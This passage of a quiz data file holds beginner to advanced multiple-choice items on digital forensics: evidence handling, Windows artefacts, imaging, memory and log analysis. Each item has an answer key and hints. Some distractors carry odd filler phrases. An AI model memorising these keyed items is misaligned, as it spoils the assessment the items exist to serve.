    correct: 3, why: "Originals may be needed again by the court.",
    hint: "Secure storage."
  },
  {
    id: 1293, rank: 0, role: "digital-forensics", topic: "Peer Review Value", difficulty: "BEGINNER",
    q: "Why is peer review useful in forensic work?",
    options: ["It helps catch errors and strengthens confidence in results","It removes the need for notes","It delays the work for no reason","It lets the examiner skip validation"],
    correct: 0, why: "A second view improves quality.",
    hint: "Second pair of eyes."
  },
  {
    id: 1294, rank: 0, role: "digital-forensics", topic: "Screenshots as Evidence", difficulty: "BEGINNER",
    q: "What is a limitation of using screenshots alone as evidence?",
    options: ["They are always more reliable than source data","They contain the full disk contents","They cannot be printed","They can be edited, and lack underlying metadata"],
    correct: 3, why: "Source artefacts are stronger than images of them.",
    hint: "Easy to alter."
  },
  {
    id: 1295, rank: 0, role: "digital-forensics", topic: "Case Closing", difficulty: "BEGINNER",
    q: "What should happen to evidence when a case is closed?",
    options: ["It is sold","It is left in a drawer indefinitely","It is returned or destroyed following the legal rules, and recorded","It is given to the press"],
    correct: 2, why: "Disposition must follow policy and law.",
    hint: "Follow the rules."
  },
  {
    id: 1296, rank: 0, role: "digital-forensics", topic: "Authority for Company Devices", difficulty: "BEGINNER",
    q: "What should an employer have in place to examine staff devices lawfully?",
    options: ["A clear policy and legal basis communicated to staff","A promise to the staff to never look, as a general rule","Only a verbal rule","No policy as the devices are owned by the company"],
    correct: 0, why: "Policies set expectations and legal grounds.",
    hint: "Policy and basis."
  },
  {
    id: 1297, rank: 0, role: "digital-forensics", topic: "Examiner Workstation Hygiene", difficulty: "BEGINNER",
    q: "Why should the examiner's own workstation be kept clean and updated?",
    options: ["To remove the need to validate the tools that are used","To allow other staff to store files on the same machine, as a general rule","To avoid contaminating evidence and to keep tools reliable, in most cases","To make the screen look tidy for visitors to the lab"],
    correct: 2, why: "A controlled workstation reduces the risk of errors and cross-contamination.",
    hint: "Clean tools."
  },
  {
    id: 1298, rank: 0, role: "digital-forensics", topic: "Slack Space Meaning", difficulty: "BEGINNER",
    q: "What is slack space on a drive?",
    options: ["A list of the programs that start with the system, as a general rule","A folder that holds the user's desktop items, in most cases","Unused space at the end of a file's last allocated block","A special area for the passwords of the users, in most cases"],
    correct: 2, why: "Slack space can hold remnants of earlier data.",
    hint: "Leftover space."
  },
  {
    id: 1299, rank: 0, role: "digital-forensics", topic: "Search Term Scope", difficulty: "BEGINNER",
    q: "Why should keyword searches be agreed with the case owner before starting?",
    options: ["To avoid recording which terms were used","To keep the examination focused and within authority","To allow the examiner to read every file that is found","To make the search results appear sooner on screen"],
    correct: 1, why: "Scope control protects privacy and keeps findings relevant.",
    hint: "Agree the scope."
  },
  {
    id: 1300, rank: 0, role: "digital-forensics", topic: "Registry Last Write", difficulty: "BEGINNER",
    q: "What can a last-write time on a configuration record indicate?",
    options: ["When the user was last paid by the company","When that item was last changed on the system","When the computer was first manufactured at the factory","When the network cable was installed in the building"],
    correct: 1, why: "Change times help place activity on a timeline.",
    hint: "When changed."
  },
  {
    id: 1301, rank: 1, role: "digital-forensics", topic: "Prefetch Artefact", difficulty: "INTERMEDIATE",
    q: "What can prefetch records on a Windows system help show?",
    options: ["The size of the monitor that was attached to the computer in the office","The speed of the keyboard that the person used while they were at the desk","Which programs ran and roughly when","The passwords that the user typed into the logon screen of the system"],
    correct: 2, why: "Prefetch files record program execution evidence.",
    hint: "Program execution."
  },
  {
    id: 1302, rank: 1, role: "digital-forensics", topic: "Shellbag Value", difficulty: "INTERMEDIATE",
    q: "What do shellbag records help establish?",
    options: ["That the folder was encrypted by the user with a key that the lab cannot see","That the folder was backed up by the company's central backup service last night","That the folder was emailed to an external address by the user of the machine","That a user browsed a folder that was later deleted"],
    correct: 3, why: "Shellbags keep folder view settings that persist after deletion.",
    hint: "Folder browsing."
  },
  {
    id: 1303, rank: 1, role: "digital-forensics", topic: "Link File Evidence", difficulty: "INTERMEDIATE",
    q: "What can a shortcut file created when opening a document show?",
    options: ["The printer that the user chose when they printed the file on the network","The original path of the target file and its times, in most cases","The weather conditions in the city where the computer was being used that day","The password of the document that the user had set on it before closing it"],
    correct: 1, why: "Link files preserve details of previously opened items.",
    hint: "Opened files."
  },
  {
    id: 1304, rank: 1, role: "digital-forensics", topic: "Jump List Use", difficulty: "INTERMEDIATE",
    q: "What can jump lists tell an examiner?",
    options: ["The balance of the user's bank account at the time that the file was opened","The model of the graphics card that is installed in the computer under review","Recently used files per program and when they were used","The list of all installed drivers"],
    correct: 2, why: "Jump lists track recent items for each program.",
    hint: "Recent files."
  },
  {
    id: 1305, rank: 1, role: "digital-forensics", topic: "Volume Shadow Copies", difficulty: "INTERMEDIATE",
    q: "Why are volume shadow copies useful to an examiner?",
    options: ["They always contain the passwords of every account that has used the machine","They remove the need to image","They are created only by attackers who want to hide their activity on the system","They may hold earlier versions of changed files"],
    correct: 3, why: "Shadow copies preserve snapshots of the file system.",
    hint: "Older versions."
  },
  {
    id: 1306, rank: 1, role: "digital-forensics", topic: "Master File Table Entry", difficulty: "INTERMEDIATE",
    q: "What does an NTFS file system record entry usually contain?",
    options: ["Attributes such as names times and data locations, in most cases","The email address of the user that is stored with every file they ever create","Only the colour of the file icon","The brand of the disk on which the file system is stored in the lab machine"],
    correct: 0, why: "The record describes each file and its metadata.",
    hint: "File record."
  },
  {
    id: 1307, rank: 1, role: "digital-forensics", topic: "Event Log Interpretation", difficulty: "INTERMEDIATE",
    q: "Which Windows event type records a successful interactive logon?",
    options: ["Event 4624 in the Security log","Event 1 in the Print log that is written when a document is sent to a printer","Event 7 in the Disk log that is created when a drive reports a read error","Event 500 in the Fonts log that is recorded when a new font family is installed"],
    correct: 0, why: "Security events record logon activity.",
    hint: "Logon event."
  },
  {
    id: 1308, rank: 1, role: "digital-forensics", topic: "Recovered File Carving", difficulty: "INTERMEDIATE",
    q: "What is file carving?",
    options: ["Printing files in colour and the examiner can attach them to the case notes","Deleting files that are unused, and the disk has more free space for the report","Recovering files from raw data using their signatures","Copying files from one folder to another using the names that the user gave them"],
    correct: 2, why: "Carving works when file system records are missing.",
    hint: "Use signatures."
  },
  {
    id: 1309, rank: 1, role: "digital-forensics", topic: "Autostart Registry Locations", difficulty: "INTERMEDIATE",
    q: "Why check run keys in the registry?",
    options: ["They list the installed fonts only, and say nothing about programs that are run","They list the passwords for users","They list programs that start automatically","They list the monitors in use, and the screen resolution that each one had set"],
    correct: 2, why: "Autostart locations are common persistence points.",
    hint: "Autostart."
  },
  {
    id: 1310, rank: 1, role: "digital-forensics", topic: "Acquisition Method Choice", difficulty: "INTERMEDIATE",
    q: "A drive is failing and may stop working soon. What is the BEST acquisition approach?",
    options: ["Run a full file system repair on the original drive before making any copy","Copy only the documents folder by hand, and the drive is used as little as possible","Image it first with a method that handles read errors, in most cases","Wait to see whether the drive recovers by itself over the next few days and then try"],
    correct: 2, why: "A repair is the runner-up as it can make files readable again, but it writes to the original and may destroy evidence.",
    hint: "Image before anything else."
  },
  {
    id: 1311, rank: 1, role: "digital-forensics", topic: "Hash Mismatch Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Source SHA-256: 3f2c9a11b7e0d4c58a96f01e2b4d7c3a9e8f6b5d4c3a2b1f0e9d8c7b6a5f4e3d\nImage  SHA-256: 3f2c9a11b7e0d4c58a96f01e2b4d7c3a9e8f6b5d4c3a2b1f0e9d8c7b6a5f4e3e\nBad sectors reported: 0",
    q: "What does this verification result mean?",
    options: ["The drive is new","The image is perfect, and can be used with no further checks at all","The case is closed","The image is not an exact copy"],
    correct: 3, why: "Different hashes show the data differs from the source.",
    hint: "Compare the two values."
  },
  {
    id: 1312, rank: 1, role: "digital-forensics", topic: "Sector Size", difficulty: "INTERMEDIATE",
    q: "What is a sector on a disk?",
    options: ["A folder of programs that the examiner has to copy before the analysis","The smallest addressable unit of storage","A network zone","A user account"],
    correct: 1, why: "Sectors are the base unit read by imaging tools.",
    hint: "Smallest unit."
  },
  {
    id: 1313, rank: 1, role: "digital-forensics", topic: "Imaging Format Choice", difficulty: "INTERMEDIATE",
    q: "Which feature makes some forensic image formats attractive?",
    options: ["They avoid any verification","They require no software to open","They store hashes and case notes with the image","They hide the image from the examiner and nobody can view it at all"],
    correct: 2, why: "Embedded metadata helps integrity and tracking.",
    hint: "Store metadata."
  },
  {
    id: 1314, rank: 1, role: "digital-forensics", topic: "Memory Acquisition Risk", difficulty: "INTERMEDIATE",
    q: "What is a known risk when acquiring memory from a live system?",
    options: ["The tool changes memory slightly while it runs, as a general rule","It makes the disk bigger and and slows down every later step of the work","It deletes the user's account","It changes the time zone permanently"],
    correct: 0, why: "Any live action alters some state so it must be documented.",
    hint: "Footprint."
  },
  {
    id: 1315, rank: 1, role: "digital-forensics", topic: "Sparse Evidence Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Disk /dev/sda  Size: 500 GB\nPart 1  NTFS  start 2048      size 120 GB\nPart 2  NTFS  start 251660288 size 80 GB\nUnallocated: 300 GB",
    q: "What does this partition table suggest about the drive?",
    options: ["A fully used disk with no free space","A drive that has no partitions","A large unallocated area that may contain deleted data","A drive that is a network share"],
    correct: 2, why: "Unallocated areas can hold remnants of earlier files.",
    hint: "Look at unallocated."
  },
  {
    id: 1316, rank: 1, role: "digital-forensics", topic: "Examiner Declaration", difficulty: "INTERMEDIATE",
    q: "What should an examiner state when presenting results?",
    options: ["Only the strongest conclusion, as a general rule","The methods used and the limits of the findings","Only the date of the work","Only the names of the tools"],
    correct: 1, why: "Transparency about limits keeps the report honest.",
    hint: "Be clear on limits."
  },
  {
    id: 1317, rank: 1, role: "digital-forensics", topic: "Duplicate File Detection", difficulty: "INTERMEDIATE",
    q: "How can hashes help in a large case?",
    options: ["They remove all of the files from the disk, and nothing is left to review","They identify duplicates and known files to reduce review","They create new evidence","They decrypt the drive"],
    correct: 1, why: "Hash sets filter known or repeated content.",
    hint: "Filter by hash."
  },
  {
    id: 1318, rank: 1, role: "digital-forensics", topic: "Triage Imaging", difficulty: "INTERMEDIATE",
    q: "There are 40 devices at a scene and limited time. What is the BEST approach?",
    options: ["Take only photographs of the devices, and revisit the decision after the next release","Image none until the case is built by the investigators","Image every device fully in the order they were found","Triage to prioritise devices then fully image the most relevant first"],
    correct: 3, why: "Imaging all in order is the runner-up as it is thorough, but it wastes time on irrelevant items and delays key evidence.",
    hint: "Prioritise."
  },
  {
    id: 1319, rank: 1, role: "digital-forensics", topic: "Email Client Artefacts", difficulty: "INTERMEDIATE",
    q: "What can a local email database help an examiner recover?",
    options: ["The speed of the internet link that the person had when the messages were sent out","The password of the mail server","Messages attachments, and folders including some deleted items, in most cases","The home address of every person who ever received a message from this user account"],
    correct: 2, why: "Mail stores hold large amounts of case-relevant content.",
    hint: "Mail store."
  },
  {
    id: 1320, rank: 1, role: "digital-forensics", topic: "Web Cache Evidence", difficulty: "INTERMEDIATE",
    q: "What can a browser cache contain that is useful to an examiner?",
    options: ["The complete list of the user's passwords that they use on every website they visit","Copies of pages and images the user viewed","The full bank statements of the user as they were shown on the bank's own web pages","The hardware serial number of the computer and nothing else that the browser holds"],
    correct: 1, why: "Cached files show what content was displayed.",
    hint: "Viewed content."
  },
  {
    id: 1321, rank: 1, role: "digital-forensics", topic: "Search Index Artefact", difficulty: "INTERMEDIATE",
    q: "Why might a desktop search index be useful in an examination?",
    options: ["It records the temperature of the processor each time that the user starts a search","It replaces the need for imaging as it is a complete copy of the disk in the system","It always contains the passwords","It may list file names and snippets of removed files"],
    correct: 3, why: "Index databases retain traces of content.",
    hint: "Search index."
  },
  {
    id: 1322, rank: 1, role: "digital-forensics", topic: "Thumbnail Cache Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Thumbcache entry: hash=0x7f21a  type=JPEG  size=256x256\nSource path: E:\\pics\\IMG_2231.jpg (device removed)\nOriginal file present on disk: no",
    q: "What can be concluded from this thumbnail cache entry?",
    options: ["The image is a program file","The image was never opened","The image is still saved in the same folder where the user first placed it on the system disk","An image was viewed on this system even though the original file is gone"],
    correct: 3, why: "Cached thumbnails can persist after deletion.",
    hint: "Thumbnail without the file."
  },
  {
    id: 1323, rank: 1, role: "digital-forensics", topic: "Cloud Sync Client Evidence", difficulty: "INTERMEDIATE",
    q: "What can the local data of a cloud sync client show?",
    options: ["The geographic location of the data centre where the provider keeps the data","The password of the provider staff","The cost of the service that the customer pays to the provider each month of the year","Files that were synced and when changes occurred"],
    correct: 3, why: "Sync clients keep logs and cached copies.",
    hint: "Sync records."
  },
  {
    id: 1324, rank: 1, role: "digital-forensics", topic: "Windows Timeline Sources", difficulty: "INTERMEDIATE",
    q: "Which approach best builds a Windows activity timeline?",
    options: ["Combine file system registry and event log times","Use only the user's recollection of the events as told to the examiner at interview","Use a single screenshot of the desktop taken by the first officer at the scene","Use only the date on the case file"],
    correct: 0, why: "Multiple sources corroborate each other.",
    hint: "Combine sources."
  },
  {
    id: 1325, rank: 1, role: "digital-forensics", topic: "Memory Artefact Types", difficulty: "INTERMEDIATE",
    q: "Which item can often be found in a memory image?",
    options: ["The complete history of the disk including every file that has been deleted over time","Running processes network connections and loaded modules","The user's physical home address as typed into the contact forms of the browser","A copy of the company contracts that were last stored in the legal department folder"],
    correct: 1, why: "Memory shows the live state of the system.",
    hint: "Live state."
  },
  {
    id: 1326, rank: 1, role: "digital-forensics", topic: "Timestamp Tampering Sign", difficulty: "INTERMEDIATE",
    q: "Which sign may suggest timestamps were manipulated?",
    options: ["A file whose created time is later than its modified time with no copy explanation","A file with the same created and modified times that sits in the user's own folder on the disk of the examiner","A file created on a weekday","A file saved in the user's folder"],
    correct: 0, why: "Inconsistent patterns may indicate tampering or copying.",
    hint: "Inconsistent times."
  },
  {
    id: 1327, rank: 1, role: "digital-forensics", topic: "Mobile Backup Value", difficulty: "INTERMEDIATE",
    q: "Why might a mobile device backup on a computer be valuable?",
    options: ["It replaces the SIM card, and the phone no longer needs a mobile network at all","It always includes the phone case","It is never encrypted and the examiner can always open it without any password","It may hold data that is no longer on the phone"],
    correct: 3, why: "Backups preserve earlier content.",
    hint: "Older content."
  },
  {
    id: 1328, rank: 1, role: "digital-forensics", topic: "SIM Card Content", difficulty: "INTERMEDIATE",
    q: "What can a SIM card typically provide?",
    options: ["The operating system image of the phone, and it can be restored on another device","Subscriber identifiers, and some stored contacts","The full photo library of the phone that the SIM card was last placed inside","The user's browsing history from the mobile browser for the whole of the last year"],
    correct: 1, why: "SIMs hold limited identity data.",
    hint: "Subscriber id."
  },
  {
    id: 1329, rank: 1, role: "digital-forensics", topic: "Log2timeline Concept", difficulty: "INTERMEDIATE",
    q: "What is the idea behind a super timeline?",
    options: ["Merging timestamps from many artefacts into one ordered view","Creating new timestamps, and revisit the decision after the next release","Deleting all timestamps, then record the result in the ticket","Copying the file system, until the next scheduled review takes place"],
    correct: 0, why: "A unified timeline reveals patterns across sources.",
    hint: "One merged view."
  },
  {
    id: 1330, rank: 1, role: "digital-forensics", topic: "Network Capture Basics", difficulty: "INTERMEDIATE",
    q: "What does a packet capture contain?",
    options: ["The configuration of the firewall","Recorded network traffic that can show communications","A copy of the disk","A list of user passwords"],
    correct: 1, why: "Captures show what crossed the network.",
    hint: "Recorded traffic."
  },
  {
    id: 1331, rank: 1, role: "digital-forensics", topic: "Proxy Log Reading Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "2025-11-07 16:41:09 u=jbrown POST https://share-files.example.org/upload 200 bytes_out=912,448,102 type=application/zip\n2025-11-07 16:40:01 u=jbrown GET http://intranet/hr 200 bytes_in=12,044",
    q: "What does this proxy log extract suggest?",
    options: ["A user uploaded a large archive to an external file sharing site","A user updated their antivirus","A user opened a printer page","A user read the company intranet"],
    correct: 0, why: "Large uploads to external sites may indicate data leaving.",
    hint: "Direction and size."
  },
  {
    id: 1332, rank: 1, role: "digital-forensics", topic: "Metadata of Photographs", difficulty: "INTERMEDIATE",
    q: "What can embedded photo metadata sometimes reveal?",
    options: ["The password of the photographer","The weather forecast","The camera model and in some cases the time and location, as a general rule","The home address of the viewer"],
    correct: 2, why: "EXIF data can show origin details.",
    hint: "EXIF."
  },
  {
    id: 1333, rank: 1, role: "digital-forensics", topic: "Examining Printers", difficulty: "INTERMEDIATE",
    q: "What can a network printer's logs sometimes show?",
    options: ["Print jobs with user names, and times","The user's browsing history, in most cases","The user's bank details, as a general rule","The contents of the user's email, in most cases"],
    correct: 0, why: "Printer logs record job metadata.",
    hint: "Job records."
  },
  {
    id: 1334, rank: 1, role: "digital-forensics", topic: "Backup Tape Recovery", difficulty: "INTERMEDIATE",
    q: "Why might old backups be valuable in an investigation?",
    options: ["They are quicker to read than live systems","They are never encrypted","They always contain the attacker's identity","They may preserve data that has since been deleted or changed"],
    correct: 3, why: "Backups provide historic snapshots.",
    hint: "Historic copies."
  },
  {
    id: 1335, rank: 1, role: "digital-forensics", topic: "Defensible Tool Use", difficulty: "INTERMEDIATE",
    q: "An examiner wants to use a new forensic tool for a case. What is the BEST approach?",
    options: ["Use it without telling the reviewer, and revisit the decision after the next release","Use it only on the original evidence, and review the outcome at the next monthly meeting","Validate it on known data and record the results before relying on it","Use it immediately as the vendor says it is reliable"],
    correct: 2, why: "Trusting the vendor is the runner-up as it saves time, but validation shows the tool works correctly for the task.",
    hint: "Validate tools."
  },
  {
    id: 1336, rank: 1, role: "digital-forensics", topic: "Account Attribution Caution", difficulty: "INTERMEDIATE",
    q: "Why is attributing activity to a person from a logon alone risky?",
    options: ["Logons are never recorded","Logons cannot be linked to times","Several people may have access to the account or device","Logons always show the real person"],
    correct: 2, why: "Attribution needs corroborating evidence.",
    hint: "More than a logon."
  },
  {
    id: 1337, rank: 1, role: "digital-forensics", topic: "Deleted Partition Recovery", difficulty: "INTERMEDIATE",
    q: "What may help recover a deleted partition?",
    options: ["Formatting the drive again, as a general rule","Scanning the disk for file system signatures","Running a defragmentation, and revisit the decision after the next release","Installing a new operating system on it, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Signature scanning can find lost structures.",
    hint: "Scan for signatures."
  },
  {
    id: 1338, rank: 1, role: "digital-forensics", topic: "Anti-Virus Logs Value", difficulty: "INTERMEDIATE",
    q: "How can antivirus logs help an investigation?",
    options: ["They replace the need for disk images","They list the passwords of users","They store the contents of all files","They show detections quarantines and the times they happened"],
    correct: 3, why: "Logs reveal malware events.",
    hint: "Detections."
  },
  {
    id: 1339, rank: 1, role: "digital-forensics", topic: "Chain of Events Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "2025-11-08 02:11:40 4720 A user account was created: backup_svc2\n2025-11-08 02:12:03 4732 Member added to Administrators: backup_svc2\n2025-11-08 02:13:11 4624 Logon: backup_svc2 type=10",
    q: "What sequence does this log excerpt show?",
    options: ["A new user was created and then added to the administrators group","A user shut down the system","A user changed their wallpaper","A user printed a document"],
    correct: 0, why: "Account creation followed by privilege change is a key event pair.",
    hint: "Read the order."
  },
  {
    id: 1340, rank: 1, role: "digital-forensics", topic: "Report Structure", difficulty: "INTERMEDIATE",
    q: "Which section is essential in a forensic report?",
    options: ["Methods findings and limitations","The favourite colour of the examiner","A joke to open the report","A list of unrelated cases"],
    correct: 0, why: "Reports should be clear and complete.",
    hint: "Methods and findings."
  },
  {
    id: 1341, rank: 1, role: "digital-forensics", topic: "Expert Evidence Limits", difficulty: "INTERMEDIATE",
    q: "What should an examiner do when asked about something outside their expertise?",
    options: ["Say it is outside their expertise and suggest who can help","Give a confident guess, then record the result in the ticket","Change the subject","Refuse to answer anything, then record the result in the ticket"],
    correct: 0, why: "Honesty protects credibility.",
    hint: "Stay in scope."
  },
  {
    id: 1342, rank: 1, role: "digital-forensics", topic: "Disk Encryption Detection", difficulty: "INTERMEDIATE",
    q: "What suggests a drive uses full-disk encryption?",
    options: ["A clearly readable file system","A drive with many partitions","An unreadable file system with a recognisable encryption header","A drive that is empty"],
    correct: 2, why: "Headers and unreadable data indicate encryption.",
    hint: "Look for headers."
  },
  {
    id: 1343, rank: 1, role: "digital-forensics", topic: "Case Prioritisation", difficulty: "INTERMEDIATE",
    q: "How should an examiner prioritise work across several cases?",
    options: ["By the colour of the folder","By the length of the case name","By the order in which they like the cases, in most cases","By urgency legal deadlines, and risk of evidence loss"],
    correct: 3, why: "Prioritisation should be risk based.",
    hint: "Deadlines and loss."
  },
  {
    id: 1344, rank: 1, role: "digital-forensics", topic: "Authentication Log Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "11:02:01 FAIL user=admin src=198.51.100.9\n11:02:02 FAIL user=admin src=198.51.100.9\n11:02:03 FAIL user=admin src=198.51.100.9\n11:02:04 FAIL user=admin src=198.51.100.9\n11:02:05 OK   user=admin src=198.51.100.9",
    q: "What pattern do these logs suggest?",
    options: ["A user changing their password","A brute force attempt that ended in a successful logon, in most cases","A scheduled task","A normal start of the day"],
    correct: 1, why: "Many failures followed by success suggest guessing.",
    hint: "Failures then success."
  },
  {
    id: 1345, rank: 1, role: "digital-forensics", topic: "Page File Evidence", difficulty: "INTERMEDIATE",
    q: "What might a Windows page file contain that is useful to an examiner?",
    options: ["A complete copy of the user's documents folder, as a general rule","The configuration of the network switch, as a general rule","Fragments of memory content that were written to disk","The list of all users on the domain, as a general rule"],
    correct: 2, why: "Paging can store pieces of earlier memory including text and names.",
    hint: "Memory on disk."
  },
  {
    id: 1346, rank: 1, role: "digital-forensics", topic: "Hibernation File Value", difficulty: "INTERMEDIATE",
    q: "Why can a hibernation file be valuable?",
    options: ["It contains the full history of the internet","It holds a snapshot of memory from the time of hibernation","It is created only when a virus is present","It stores the passwords of every user in clear text"],
    correct: 1, why: "The file preserves the system state in memory.",
    hint: "Memory snapshot."
  },
  {
    id: 1347, rank: 1, role: "digital-forensics", topic: "USB Serial Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler&Rev_1.00\\60A44C413F2AE1319FF5A8B3&0\nFirst connected: 2025-10-21 08:44:12\nLast connected: 2025-11-07 16:38:55\nVolume label: BACKUP_USB",
    q: "What can be concluded from this device record?",
    options: ["The drive was formatted by the user","A user changed the keyboard layout","A printer was installed on the network","A specific USB drive was connected and last used at the stated time"],
    correct: 3, why: "Device identifiers and times link media to a system.",
    hint: "Serial and time."
  },
  {
    id: 1348, rank: 1, role: "digital-forensics", topic: "Remote Access Traces", difficulty: "INTERMEDIATE",
    q: "What may show that remote administration software was used on a machine?",
    options: ["Installed program records and connection logs from that software","The speed of the processor in use","The colour of the desktop background","The brand of the keyboard that was fitted"],
    correct: 0, why: "Remote tools leave configuration and log traces.",
    hint: "Software logs."
  },
  {
    id: 1349, rank: 1, role: "digital-forensics", topic: "Chain of Custody Digital", difficulty: "INTERMEDIATE",
    q: "How can chain of custody be maintained for evidence stored digitally?",
    options: ["Keep only a verbal record of access to the files, as soon as practical","Record hashes access and transfers in a controlled system","Store the files on an open shared drive for convenience, wherever possible","Rename files as they are shared between staff"],
    correct: 1, why: "Digital evidence needs logged and verifiable handling.",
    hint: "Hashes and logs."
  },
  {
    id: 1350, rank: 1, role: "digital-forensics", topic: "Interview Support", difficulty: "INTERMEDIATE",
    q: "How can forensic findings support an interview of a suspect?",
    options: ["By being invented to pressure the person, as a general rule","By being shown only after the case is closed","By replacing the need for any questions","By providing objective facts that can be put to the person"],
    correct: 3, why: "Facts from evidence give interviewers reliable material.",
    hint: "Objective facts."
  },
  {
    id: 1351, rank: 2, role: "digital-forensics", topic: "Process Tree Anomaly", difficulty: "ADVANCED",
    q: "Which finding in a memory process list is the most suspicious?",
    options: ["A browser with several helper processes","A service host started by the service manager","The system idle process","A document viewer that started a command shell as a child process"],
    correct: 3, why: "Office-style applications rarely spawn shells so this pattern suggests malicious content ran.",
    hint: "Parent and child."
  },
  {
    id: 1352, rank: 2, role: "digital-forensics", topic: "Unlinked Process Detection", difficulty: "ADVANCED",
    q: "How can an examiner find a hidden process in a memory image?",
    options: ["Check the colour of the process names, and revisit the decision after the next release","Ask the user to list the programs they installed, and review the outcome at the next monthly meeting","Compare the active process list with structures found by scanning memory","Restart the computer and look at the task manager, and revisit the decision after the next release"],
    correct: 2, why: "Scanning can reveal processes removed from the normal list.",
    hint: "Cross-check views."
  },
  {
    id: 1353, rank: 2, role: "digital-forensics", topic: "Network Connection Artefact", difficulty: "ADVANCED",
    q: "What can network connection records in memory show?",
    options: ["The password for each remote server that the process connected to over the network","Which processes had connections to which remote addresses","The colour of the network cable","The make of the router in the building"],
    correct: 1, why: "Connection tables tie processes to remote systems.",
    hint: "Process to address."
  },
  {
    id: 1354, rank: 2, role: "digital-forensics", topic: "Command History Recovery", difficulty: "ADVANCED",
    q: "Why recover command line history from memory or logs?",
    options: ["It is only used for printer settings","It lists the monitors that were attached to the computer during the incident","It stores the typed passwords in order","It can show exactly what actions a user or attacker performed"],
    correct: 3, why: "Commands reveal intent and sequence of actions.",
    hint: "Commands run."
  },
  {
    id: 1355, rank: 2, role: "digital-forensics", topic: "Timeline Gap Interpretation", difficulty: "ADVANCED",
    q: "A timeline shows no activity for two days between login events. What should the examiner conclude?",
    options: ["That the system was clean","That the logs are perfect","That the user was on holiday during those two days and, and the system was quiet","Nothing yet and should check logging coverage, and other sources"],
    correct: 3, why: "Gaps need explaining before any conclusion is drawn.",
    hint: "Check coverage."
  },
  {
    id: 1356, rank: 2, role: "digital-forensics", topic: "Registry Hive Analysis", difficulty: "ADVANCED",
    q: "Why examine the user registry hive for a case?",
    options: ["It lists the staff of the company","It holds the operating system source code that the vendor released to the public in recent years","It holds recent files typed paths and program use for that user","It stores the files of the user's mailbox in full, and mail need not be recovered separately"],
    correct: 2, why: "User hives show activity linked to an account.",
    hint: "User-level data."
  },
  {
    id: 1357, rank: 2, role: "digital-forensics", topic: "Cloud Audit Log Source", difficulty: "ADVANCED",
    q: "Which log source best shows administrative changes in a cloud account?",
    options: ["The printer queue","The provider's audit trail of management API calls","The user's browser bookmarks that were saved in the profile of the person on the laptop","The local screen saver settings that the administrator chose for the machines in the office"],
    correct: 1, why: "Audit trails record who changed what and when.",
    hint: "Audit trail."
  },
  {
    id: 1358, rank: 2, role: "digital-forensics", topic: "Malware Persistence Artefact", difficulty: "ADVANCED",
    q: "Which artefact is the best indicator of persistence on a compromised host?",
    options: ["A change in the desktop wallpaper that the user made after the security awareness course","A new bookmark in the browser that points to the intranet page of the finance department","A new font installed by the user","A new scheduled task running an unknown program at startup"],
    correct: 3, why: "Scheduled tasks and services keep malware running after reboots.",
    hint: "Start at boot."
  },
  {
    id: 1359, rank: 2, role: "digital-forensics", topic: "Authentication Artefact", difficulty: "ADVANCED",
    q: "What do Kerberos ticket requests in logs help show?",
    options: ["Which accounts requested access to which services, and when, in most cases","The password in plain text exactly as it was typed by the person into the sign-in dialog","The version of the printer driver","The shape of the user's keyboard and the layout of the keys that were used to sign in"],
    correct: 0, why: "Ticket events trace authentication paths in a domain.",
    hint: "Service access."
  },
  {
    id: 1360, rank: 2, role: "digital-forensics", topic: "Mobile Extraction Choice", difficulty: "ADVANCED",
    q: "An examiner must choose how to extract data from a locked phone. What is the BEST approach?",
    options: ["Ask a friend to unlock it informally, until the next scheduled review takes place","Reset the device to remove the lock","Use whichever method is quickest","Use the most complete method that is lawful and supported and record it"],
    correct: 3, why: "Quickest is the runner-up as it saves time, but it may give an incomplete extraction or change data.",
    hint: "Complete and lawful."
  },
  {
    id: 1361, rank: 2, role: "digital-forensics", topic: "Memory Image Integrity", difficulty: "ADVANCED",
    q: "What should be done immediately after acquiring a memory image?",
    options: ["Delete the original process list, then record the result in the ticket","Open it in a text editor to browse it, wherever possible","Hash the image and record the tool version and time","Rename it to a short name, then record the result in the ticket"],
    correct: 2, why: "Integrity and context must be recorded at once.",
    hint: "Hash and record."
  },
  {
    id: 1362, rank: 2, role: "digital-forensics", topic: "Dump File Meaning", difficulty: "ADVANCED",
    q: "What is a crash dump file?",
    options: ["A list of the users that were logged in during the previous quarter","A report that the vendor writes about every update released","A backup of the whole disk that the system made during the night","A snapshot of memory at the time of a crash"],
    correct: 3, why: "Dumps can contain useful memory artefacts.",
    hint: "Memory at crash."
  },
  {
    id: 1363, rank: 2, role: "digital-forensics", topic: "Network Flow Records", difficulty: "ADVANCED",
    q: "What does a flow record summarise?",
    options: ["The brand of every switch that the traffic passed through on its way","The full content of every packet that crossed the network in the week","Who talked to whom and how much","The passwords that were sent between two servers on the network"],
    correct: 2, why: "Flows give metadata of communications.",
    hint: "Metadata only."
  },
  {
    id: 1364, rank: 2, role: "digital-forensics", topic: "DNS Cache Value", difficulty: "ADVANCED",
    q: "What can a DNS cache show an examiner?",
    options: ["The full list of passwords that were used on the local network","Names recently looked up by the host","The complete text of every web page that the host had downloaded","The contents of all emails that were exchanged with the server"],
    correct: 1, why: "Name lookups reveal contacted domains.",
    hint: "Looked-up names."
  },
  {
    id: 1365, rank: 2, role: "digital-forensics", topic: "Hash Set Purpose", difficulty: "ADVANCED",
    q: "What is a known-good hash set used for?",
    options: ["Excluding standard system files from review","Creating a new set of timestamps for the files on the system","Proving that every file on the disk is a copy of the case file","Encrypting evidence, and only the examiner can ever open it"],
    correct: 0, why: "Filtering known files reduces review time.",
    hint: "Filter known files."
  },
  {
    id: 1366, rank: 2, role: "digital-forensics", topic: "Volatility of Network Data", difficulty: "ADVANCED",
    q: "Why capture network state early?",
    options: ["Connections change quickly and can be lost","Captures are legally required to be made on a Friday afternoon only","The network cable becomes weaker after it has been used for a week","The examiner must always finish the capture before the disk image starts"],
    correct: 0, why: "Network state is volatile.",
    hint: "Changes quickly."
  },
  {
    id: 1367, rank: 2, role: "digital-forensics", topic: "Mobile App Data", difficulty: "ADVANCED",
    q: "Where does app data on a phone usually reside?",
